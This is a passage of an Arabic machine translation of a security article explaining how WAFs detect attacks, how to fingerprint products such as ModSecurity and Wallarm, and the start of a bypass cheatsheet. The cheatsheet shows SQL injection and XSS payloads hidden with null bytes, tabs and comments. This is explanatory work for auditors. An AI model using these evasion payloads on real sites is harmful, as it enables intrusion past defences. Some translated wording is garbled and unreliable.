<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤠 🌛 🙌🏿 WAF من خلال عيون المتسللين ⏲️ 🥠 😹</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="سنتحدث اليوم عن إحدى آليات الأمان الحديثة لتطبيقات الويب ، وهي جدار حماية تطبيقات الويب (WAF). سنناقش WAFs الحديثة وما تستند إليه ، بالإضافة إلى التقن...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>WAF من خلال عيون المتسللين</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/454592/" style=";text-align:right;direction:rtl"><img align="left" src="https://habrastorage.org/webt/nx/mm/yz/nxmmyzb6nr39jk_zmiu5wcnylbm.png">  سنتحدث اليوم عن إحدى آليات الأمان الحديثة لتطبيقات الويب ، وهي جدار حماية تطبيقات الويب (WAF).  سنناقش WAFs الحديثة وما تستند إليه ، بالإضافة إلى التقنيات الالتفافية ، وكيفية استخدامها ، ولماذا يجب ألا تعتمد مطلقًا على WAF.  نحن نتحدث من وجهة نظر المخلوقات.  لم نقم بتطوير WAFs ولم نجمع سوى البيانات من المصادر المفتوحة.  وبالتالي ، لا يمكننا إلا أن نشير إلى تجربتنا الخاصة وربما نكون غير مدركين لبعض خصائص WAFs. <br clear="left"><a name="habracut"></a><br><hr><br><br>  <i>إخلاء المسئولية: هذه ترجمة للمقال من الروسية إلى الإنجليزية ، تم إصدار المقال في نهاية عام 2017 ، على التوالي ، قد تصبح بعض المعلومات قديمة.</i> <br><br><h4 style=";text-align:right;direction:rtl">  محتويات </h4><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  مقدمة </li><li style=";text-align:right;direction:rtl">  و WAF الحديثة </li><li style=";text-align:right;direction:rtl">  تحديد WAF </li><li style=";text-align:right;direction:rtl">  WAF الالتفافية cheatsheet </li><li style=";text-align:right;direction:rtl">  WAF الالتفافية في الممارسة العملية </li><li style=";text-align:right;direction:rtl">  استنتاج </li></ol><br>  <i>إذا كنت تعرف سبب استخدام WAFs وكيفية عملها ، يمكنك القفز مباشرةً إلى القسم الالتفافي.</i> <br><br><h2 style=";text-align:right;direction:rtl">  مقدمة </h2><br>  أصبحت WAFs شعبية جدا في الآونة الأخيرة.  يقدم البائعون حلولًا مختلفة في نطاقات أسعار مختلفة ، وأدوات توزيع وخيارات ، تستهدف العملاء المختلفين ، من الشركات الصغيرة إلى الشركات الكبيرة.  تحظى شبكات WAF بشعبية لأنها حل معقد لحماية تطبيقات الويب التي تغطي مجموعة كاملة من المهام.  لهذا السبب يمكن لمطوري تطبيقات الويب الاعتماد على WAF في بعض جوانب الأمان.  على الرغم من أن WAFs لا يمكنها منح الأمان الكامل. <br><br><img src="https://habrastorage.org/webt/59/e3/95/59e395af93092095133873.png"><br><br>  لذا ، ما الذي يجب أن تكون WAF قادرة على تبرير تنفيذه في مشروع؟  وتتمثل مهمتها الرئيسية في اكتشاف ومنع أي طلب يحتوي ، وفقًا لتحليل WAF ، على أي شذوذ أو ناقل للهجوم.  يجب ألا يعيق التحليل التفاعل بين المستخدمين الشرعيين وتطبيق الويب بينما في الوقت نفسه ، يجب أن يكتشف بدقة وفي الوقت المناسب أي محاولات هجوم.  من أجل تنفيذ هذه الوظيفة ، يستخدم مطورو WAF التعبيرات العادية والرموز الرمزية وتحليل السلوك وتحليل السمعة والتعلم الآلي بالطبع.  في كثير من الأحيان ، يتم استخدام كل هذه التقنيات معًا.  قد يقوم WAF أيضًا بتنفيذ وظائف أخرى: حماية DDoS ، حظر عناوين IP للمهاجمين ، مراقبة عناوين IP المشبوهة ، إضافة رؤوس الأمان (X-XSS-Protection ، X-Frame-Options ، وما إلى ذلك) ، إضافة علامات http فقط إلى ملف تعريف الارتباط ، وتنفيذ آلية HSTS ورموز CSRF.  أيضا ، بعض WAFs لديها وحدات العميل جافا سكريبت للمواقع. <br><br>  بالطبع ، تخلق WAFs بعض العقبات أمام المتسللين والمثقفين.  يجعل WAF اكتشاف الثغرات واستغلالها أكثر كثافة للموارد (باستثناء ما إذا كان المهاجم يعرف طرق تجاوز فعالة لليوم 0 لـ WAF محدد).  الماسحات الضوئية التلقائية غير مجدية عملياً عند تحليل تطبيقات الويب المحمية بـ WAF.  WAF هو حماية موثوقة ضد "scriptkiddies".  على الرغم من ذلك ، ربما لا يرغب أحد المتسللين أو الباحثين ذوي الخبرة دون وجود دوافع كافية في إضاعة الوقت في محاولة لإيجاد طرق لتجاوزه.  تجدر الإشارة إلى أن تطبيق الويب الأكثر تعقيدًا هو أكبر مساحة للهجوم ، وأسهل العثور على طريقة الالتفافية. <br><br>  في عمليات التدقيق التي أجريناها مؤخرًا ، وجدنا في كثير من الأحيان WAFs مختلفة.  سنتحدث عن بعضهم لاحقًا.  لقد اختبرنا بالفعل WAFs مملوكتين في سيناريوهين رئيسيين: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  نحن نعلم أن هناك ثغرة أمنية معينة في تطبيق الويب ونحاول تجاوز WAF لاستغلاله ؛ </li><li style=";text-align:right;direction:rtl">  لا نعرف أي نقاط ضعف ، لذلك يتعين علينا العثور على واحدة على الرغم من WAF ومن ثم استغلالها لتجاوز WAF. </li></ul><br>  لكن أولاً ، دعونا نلقي نظرة فاحصة على الآليات الأساسية وراء WAF ونرى ما هي المشاكل التي يواجهونها. <br><br><h2 style=";text-align:right;direction:rtl">  و WAF الحديثة </h2><br>  لتكون قادرًا على إيجاد طرق مختلفة لتجاوز WAF بفعالية ، أولاً ، نحتاج إلى معرفة الآليات الحديثة لتصنيف الطلبات.  كل WAF محددة ومبنية بشكل فريد ، ولكن هناك بعض طرق التحليل العامة.  دعونا نلقي نظرة على هؤلاء. <br><br><img src="https://habrastorage.org/webt/59/e3/95/59e395af93c4f468367566.png"><br><br><h4 style=";text-align:right;direction:rtl">  القواعد القائمة على التعبيرات العادية </h4><br>  تستخدم غالبية WAFs الموجودة قواعد تستند إلى تعبيرات منتظمة.  يبحث المطور عن مجموعة معينة من الهجمات المعروفة لتحديد الهياكل النحوية الأساسية التي يمكن أن تشير إلى أي هجوم.  بناءً على هذه البيانات ، ينشئ المطور تعبيرات منتظمة تجد مثل هذه التركيبات النحوية.  هذا يبدو بسيطًا ، لكن هذه الطريقة لها عيوب معينة.  أولاً ، يمكن تطبيق تعبير عادي على طلب واحد فقط ، أو حتى معلمة طلب واحد ، مما يقلل بشكل واضح من كفاءة هذه القواعد ويترك بعض النقاط العمياء.  ثانياً ، يؤدي بناء جملة التعبيرات العادية والمنطق المعقد للبروتوكولات النصية ، والذي يسمح باستبدال الهياكل المكافئة واستخدام تمثيل الرموز المختلفة ، إلى أخطاء أثناء إنشاء هذه القواعد. <br><br>
<h4 style=";text-align:right;direction:rtl">  Scorebuilding </h4><br>  يجب أن يكون أولئك الذين يعرفون كيفية عمل جدران الحماية والشبكات المضادة للفيروسات على دراية بهذه الآلية.  لا يكتشف الهجمات ولكنه يكمل الآليات الأخرى مما يجعلها أكثر دقة ومرونة.  الشيء هو أن البنية "المشبوهة" في الطلب ليست شرطا كافيا للكشف عن الهجوم وقد تؤدي إلى العديد من الإيجابيات الخاطئة.  يتم حل هذه المشكلة عن طريق تطبيق نظام الدرجات.  وتستكمل كل قاعدة تستند إلى التعبيرات العادية بالمعلومات المتعلقة بأهميتها ؛  بعد تحديد جميع القواعد التي يتم تشغيلها ، يتم تلخيص مدى أهميتها.  إذا وصلت درجة الأهمية الكلية إلى القيمة الدنيا ، فسيتم اكتشاف الهجوم ويتم حظر الطلب.  على الرغم من بساطتها ، أثبتت هذه الآلية أنها فعالة وتستخدم على نطاق واسع لمثل هذه المهام. <br><br><h4 style=";text-align:right;direction:rtl">  Tokenizers </h4><br>  تم تقديم طريقة الكشف هذه في Black Hat 2012 باعتبارها <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">libinjection في</a> مكتبة C / C + ، والتي تسمح بتحديد حقن SQL بسرعة وبدقة.  في هذه اللحظة ، هناك العديد من منافذ libinjection للغات البرمجة المختلفة ، مثل PHP ، Lua ، Python ، إلخ.  تبحث هذه الآلية عن التوقيعات المقدمة كمجموعة من الرموز.  هناك عدد معين من التوقيعات مدرجة في القائمة السوداء ، وتعتبر غير مرغوب فيها وخبيثة.  بمعنى آخر ، قبل تحليل بعض الطلبات ، يتم ترجمته إلى مجموعة من الرموز.  الرموز مقسمة إلى أنواع معينة ، مثل متغير ، سلسلة ، عامل تشغيل عادي ، غير معروف ، رقم ، تعليق ، عامل تشبه الوحدة ، دالة ، فاصلة ، إلخ.  أحد العيوب الرئيسية لهذا الأسلوب هو أنه من الممكن إنشاء بنية تؤدي إلى تكوين الرموز بشكل غير صحيح ، وبالتالي سيختلف توقيع الطلب عن المتوقع.  يشار عادةً إلى هذه الهياكل على أنها كسارات رمزية ، وسنناقشها لاحقًا <br><br><h4 style=";text-align:right;direction:rtl">  تحليل السلوك </h4><br>  إن اكتشاف محاولات الاستغلال ومنعها في الطلبات ليست المهمة الوحيدة لـ WAFs.  من المهم أيضًا تحديد عملية البحث عن الثغرات ويجب أن يتفاعل WAF وفقًا لذلك.  قد يظهر نفسه كمحاولات مسح ضوئي ، ودليل القوة الغاشمة في الدليل ، ومعلمات الانصهار ، وطرق تلقائية أخرى.  بإمكان WAFs المتقدمة إنشاء سلاسل طلبات نموذجية للسلوك المعتاد ومنع محاولات إرسال طلبات غير عادية.  هذه الطريقة لا تكتشف الكثير من الهجمات ، لأنها تعيق عملية البحث عن الثغرات الأمنية.  لن يؤثر تحديد عدد الطلبات في الدقيقة على مستخدم معتاد ولكنه سيكون عقبة خطيرة أمام الماسحات الضوئية التي تعمل في عدة سلاسل رسائل. <br><br><h4 style=";text-align:right;direction:rtl">  تحليل السمعة </h4><br>  هذه آلية أخرى موروثة مباشرة من جدران الحماية ومكافحة الفيروسات.  اليوم ، يشتمل أي WAF تقريبًا على قوائم بعناوين VPN ومجهولي الهوية وعقد Tor وشبكات الروبوت لمنع طلبات من هؤلاء.  يمكن لـ WAFs المتقدمة تحديث قواعدها تلقائيًا واستكمالها بإدخالات إضافية بناءً على حركة المرور التي تم تحليلها. <br><br><h4 style=";text-align:right;direction:rtl">  تعلم الآلة </h4><br>  هذا هو واحد من أكثر الجوانب المشكوك فيها في WAF.  دعونا نلاحظ أن مصطلح "التعلم الآلي" واسع للغاية ويشمل العديد من التقنيات والطرق.  الى جانب ذلك ، انها مجرد واحدة من فئات منظمة العفو الدولية.  يعد "تنفيذ" التعلم الآلي أو "استخدام الذكاء الاصطناعي" عبارات تسويقية شائعة للغاية.  ليس من الواضح دائمًا الخوارزميات التي يتم استخدامها بالضبط ، وفي بعض الأحيان يبدو الأمر مجرد رطانة.  هؤلاء البائعون الذين يستخدمون حقًا التعلم الآلي ويقومون به بفعالية ليسوا على استعداد لمشاركة خبراتهم.  وهذا يجعل من الصعب على شخص غريب محاولة معرفة الموقف.  ومع ذلك ، دعونا نحاول توضيح بعض النقاط بناءً على المعلومات المتاحة. <br><br>  أولاً ، يعتمد التعلم الآلي اعتمادًا كليًا على البيانات التي تم تدريبها عليها ، مما يشكل مشكلة معينة.  يجب أن يتمتع المطور بقاعدة كاملة ومحدثة من الهجمات ، والتي يصعب تحقيقها.  لهذا السبب يسجل العديد من المطورين نتائج WAFs الخاصة بهم ويتعاونون مع البائعين الذين يوفرون أنظمة IDS و SIEM للحصول على أمثلة للهجمات في العالم الحقيقي.  ثانياً ، قد يكون النموذج المدرب على تطبيق ويب مجردة غير فعال تمامًا على تطبيق ويب حقيقي.  للحصول على جودة أفضل ، يوصى بتدريب نموذج إضافي في مرحلة التنفيذ ، وهو كثيف الاستخدام للموارد ويستغرق وقتًا طويلاً ولا يزال لا يمنح أفضل النتائج. <br><br><h2 style=";text-align:right;direction:rtl">  تحديد WAF </h2><br>  يستخدم مطورو WAF طرقًا مختلفة لإعلام المستخدم بأنه تم حظر الطلب.  وبالتالي ، يمكننا تحديد WAF من خلال تحليل الاستجابة لطلب الهجوم لدينا.  يشار إلى هذا عادة بصمة WAF.  يمكن أن تساعد بصمات الأصابع إذا لم يتم تحديث WAF لسبب ما (ينطبق معظمها على المشاريع مفتوحة المصدر).  يهتم مطورو WAFs الخاصة بعملائهم وتنفيذ التحديثات التلقائية.  وأيضًا ، بمجرد تحديد WAF ، والذي تبين أنه تم تحديثه ، لا يزال بإمكاننا استخدام المعلومات المتعلقة به لمعرفة شيء ما عن منطقه. <br><br>  فيما يلي قائمة ببصمات WAF المحتملة: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ملفات تعريف الارتباط الإضافية </li><li style=";text-align:right;direction:rtl">  رؤوس إضافية لأي استجابة أو طلب </li><li style=";text-align:right;direction:rtl">  محتويات الاستجابة (في حالة الطلب المحظور) </li><li style=";text-align:right;direction:rtl">  رمز الاستجابة (في حالة الطلب المحظور) </li><li style=";text-align:right;direction:rtl">  عنوان IP (السحابة WAF) </li><li style=";text-align:right;direction:rtl">  وحدة جانب عميل JS (جانب العميل WAF) </li></ul><br>  دعونا توضيح ذلك مع بعض الأمثلة <br><br>  <b>PT AF</b> <br>  رمز الاستجابة للطلب المحظور: 403 <br>  يمكن إدراج الوحدة النمطية للعميل waf.js في صفحة الاستجابة <br>  نص الاستجابة: <br><br><pre style=";text-align:right;direction:rtl"><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Forbidden<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pre</span></span></span><span class="hljs-tag">&gt;</span></span>Request ID: 2017-07-31-13-59-56-72BCA33A11EC3784<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pre</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  رأس إضافي يضيف بواسطة waf.js: <br><br><pre style=";text-align:right;direction:rtl"> <code class="xml hljs">X-RequestId: cbb8ff9a-4e91-48b4-8ce6-1beddc197a30</code> </pre> <br>  <b>نيميسيدا واف</b> <br>  رمز الاستجابة للطلب المحظور: 403 <br>  نص الاستجابة: <br><br><pre style=";text-align:right;direction:rtl"> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"font-size: 16px; align: center;"</span></span></span><span class="hljs-tag">&gt;</span></span> Suspicious activity detected. Access to the site is blocked. If you think that is's an erroneous blocking, please email us at <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"mailto:nwaf@pentestit.ru"</span></span></span><span class="hljs-tag">&gt;</span></span>nwaf@pentestit.ru<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span> and specify your IP-address. <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  <b>Wallarm</b> <br>  رمز الاستجابة للطلب المحظور: 403 <br>  رأس إضافي: nginx-wallarm <br><br>  <b>سيتريكس NetScaler AppFirewall</b> <br>  ملف تعريف ارتباط إضافي: <br><br><pre style=";text-align:right;direction:rtl"> <code class="xml hljs">ns_af=31+LrS3EeEOBbxBV7AWDFIEhrn8A000; ns_af_.target.br_%2F_wat=QVNQU0VTU0lP TklEQVFRU0RDU0Nf?6IgJizHRbTRNuNoOpbBOiKRET2gA</code> </pre> <br>  <b>Mod_Security ver.</b>  <b>2.9</b> <br>  رمز الاستجابة للطلب المحظور: 403 <br>  هيئة الاستجابة: <br><br><pre style=";text-align:right;direction:rtl"> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>403 Forbidden<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Forbidden<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>You don't have permission to access /form.php on this server.<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag"> /&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  <b>Mod_Security ver.</b>  <b>&lt;2.9</b> <br>  رمز الاستجابة للطلب المحظور: 406 أو 501 <br>  في نص الاستجابة ، يمكنك العثور على mod_security أو Mod_Security أو NOYB <br><br>  <b>جدار الحماية الورنيش</b> <br>  يضيف الرؤوس التالية إلى الاستجابة: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">X-Varnish: 127936309 131303037. X-Varnish: 435491096 Via: 1.1 varnish-v4</code> </pre> <br>  يقرر مطورو WAF أنفسهم رمز الاستجابة المطلوب إرجاعه في حالة وجود طلب محظور ؛  هناك بعض الرموز المحددة كذلك.  على سبيل المثال ، تقوم Web_Knight WAF بإرجاع الرمز 999 ، بينما يعرض dotDefender الكود 200 مع نص استجابة فارغ أو مع رسالة خطأ.  إلى جانب ذلك ، يمكن للمطورين إنشاء صفحة استجابة مخصصة مع بعض المحتويات الأخرى. <br><br>  WAF ، مثل أي تطبيق آخر ، يتطور ويتغير.  لهذا السبب من المهم التحقق باستمرار من أهمية بصمات الأصابع لديك. <br><br><h2 style=";text-align:right;direction:rtl">  WAF الالتفافية ورقة الغش </h2><br>  الفكرة العامة وراء إيجاد طرق لتجاوز WAF هي تحويل الطلب الذي نحتاجه بحيث لا يزال صالحًا لتطبيق الويب ولكن ليس بالنسبة إلى WAF أو يبدو أنه غير ضار.  من المهم أن يتمكن نوع واحد من WAF من تقديم العديد من أنواع الخوادم المختلفة ، بما في ذلك الخوادم "الغريبة" ، مثل Unicorn و Tornado و Weblogic و Lighttpd ، إلخ.  قد ينظر كل خادم إلى حالات استثنائية لتحليل طلبات HTTP بطريقة مختلفة ، والتي يجب أيضًا أن يتم النظر فيها بواسطة WAF.  وبالتالي ، يمكن للمهاجم استخدام تفاصيل خوادم تحليل طلب HTTP لإيجاد طريقة لتجاوز WAF. <br><br><img src="https://habrastorage.org/webt/59/e3/95/59e395afb9650235665851.png"><br><br>  من الصعب تصنيف جميع الطرق الممكنة لتجاوز WAF إما عن طريق آليات أمان WAF أو حسب مجال الاستخدام.  قد تتفاعل الطرق الالتفافية نفسها وتؤثر في نفس الوقت على مكونات مختلفة من WAF.  تم جمع التقنيات الموضحة أدناه من مصادر مفتوحة أو اكتشفت خلال بحثنا الخاص وأثبتت أنها من بين الأكثر فعالية. <br><br><h4 style=";text-align:right;direction:rtl">  مضيفا الرموز الخاصة </h4><br>  يمكن أن تنتهك الرموز الخاصة المختلفة منطق تحليل WAF وفي نفس الوقت يتم تفسيرها من قبل الخادم.  قد تختلف أشكال هذه الرموز: فقد تتحول إلى كود urlencode (على الرغم من أن معظم WAFs يمكنها التعامل مع ذلك) أو ترميزات أخرى.  من الممكن أيضًا إدراج رموز خاصة في طلب ما دون أي تشفير ، بتنسيق أولي ، مما قد يفاجئ WAF.  على سبيل المثال ، يمكن اعتبار <b>\ r \ n \ r \ n</b> في هذا العرض التقديمي نهاية لنص طلب HTTP ، ويمكن للبايت الفارغة أن تنتهك منطق تحليل التعبيرات العادية ومحللات البيانات تمامًا.  أيضًا ، قد تكون الرموز الخاصة الأخرى من الرموز العشرين الأولى لجدول ASCII مفيدة. <br>  الأمثلة على ذلك: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  0x00 - بايت فارغة ؛ </li><li style=";text-align:right;direction:rtl">  0x0D - إرجاع النقل ؛ </li><li style=";text-align:right;direction:rtl">  0x0A - تغذية الخط ؛ </li><li style=";text-align:right;direction:rtl">  0x0B - علامة تبويب عمودي ؛ </li><li style=";text-align:right;direction:rtl">  0x09 - علامة تبويب أفقية ؛ </li><li style=";text-align:right;direction:rtl">  0x0C - صفحة جديدة </li></ul><br>  أثناء البحث عن تجاوز ، من المفيد إدراج رموز خاصة في أماكن مختلفة في نص الطلب وليس فقط في قيم المعلمات.  على سبيل المثال ، إذا كان الطلب بتنسيق JSON ، فيمكننا إدراج NULL-بايت على حد سواء في معلمة وبين المعلمات ، سواء في بداية ونهاية JSON.  الأمر نفسه ينطبق على الأشكال الأخرى من نص طلب POST.  بشكل عام ، نوصي بالقيام بالبحث والاستمتاع ، والبحث عن الأماكن التي يمكن رصدها وتحليلها بواسطة WAF ، ومحاولة استخدام رموز خاصة مختلفة هناك. <br><br>  على سبيل المثال: <br><br><pre style=";text-align:right;direction:rtl"> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">1337</span></span>,<span class="hljs-attr"><span class="hljs-attr">"string0x00"</span></span>:<span class="hljs-string"><span class="hljs-string">"test' or sleep(9)#"</span></span>} {<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">1337</span></span>,<span class="hljs-attr"><span class="hljs-attr">"string"</span></span>:<span class="hljs-string"><span class="hljs-string">"test'/*0x00*/ or sleep(9)#"</span></span>} {<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">1337</span></span>,<span class="hljs-attr"><span class="hljs-attr">"string"</span></span>0x0A0x0D:<span class="hljs-string"><span class="hljs-string">"test' or sleep(9)#"</span></span>}</code> </pre> <br><pre style=";text-align:right;direction:rtl"> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ja0x09vas0x0A0x0Dcript:alert(1)"</span></span></span><span class="hljs-tag">&gt;</span></span>clickme<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">0x00</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:alert(1)"</span></span></span><span class="hljs-tag">&gt;</span></span>clickme<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">0x00</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"alert(1)"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><pre style=";text-align:right;direction:rtl"> <code class="sql hljs">id=1337<span class="hljs-comment"><span class="hljs-comment">/*0x0C*/</span></span>1 UNION <span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">version</span></span>(), <span class="hljs-keyword"><span class="hljs-keyword">user</span></span>() <span class="hljs-comment"><span class="hljs-comment">--</span></span></code> </pre> <br>  <i>من أجل الوضوح ، استبدلنا الرموز الخاصة بعرضها السداسي.</i> <br><br><h4 style=";text-align:right;direction:rtl">  استبدال رموز الفضاء </h4><br>  في معظم بناء الجملة ، يجب فصل الكلمات الأساسية والعوامل ، لكن لم يتم تحديد رموز الفضاء المفضلة.  وبالتالي ، بدلاً من <b>0x20</b> (مساحة) الشائعة ، يمكنك استخدام <b>0x0B</b> (علامة تبويب عمودي) أو <b>0x09</b> (علامة تبويب أفقية).  استبدال المساحات بهياكل تقسيم دون معانيها يندرج في نفس الفئة.  في SQL ، يكون <b>/ ** /</b> (تعليقات SQL متعددة الأسطر) ، <b># \ r \ n</b> (تعليق SQL من سطر واحد ، ينتهي بتغذية سطر) ، <b>- \ r \ n</b> (تعليق SQL بديل من سطر واحد ، ينتهي مع تغذية الخط).  فيما يلي بعض الأمثلة: <br><br><pre style=";text-align:right;direction:rtl"> <code class="html hljs xml">http://test.com/test?id=1%09union/**/select/**/1,2,3 http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3</code> </pre> <br>  أيضًا ، يمكننا تحويل تعبير للتخلص من المسافات باستخدام بناء جملة اللغة.  على سبيل المثال ، في SQL ، يمكننا استخدام الأقواس: <br><br><pre style=";text-align:right;direction:rtl"> <code class="sql hljs">UNION(<span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>),<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span>,<span class="hljs-number"><span class="hljs-number">5</span></span>,(<span class="hljs-number"><span class="hljs-number">6</span></span>)<span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">Users</span></span>)<span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span>(login=<span class="hljs-string"><span class="hljs-string">'admin'</span></span>))</code> </pre> <br>  وفي JS ، استخدم <b>/</b> : <br><br><pre style=";text-align:right;direction:rtl"> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span 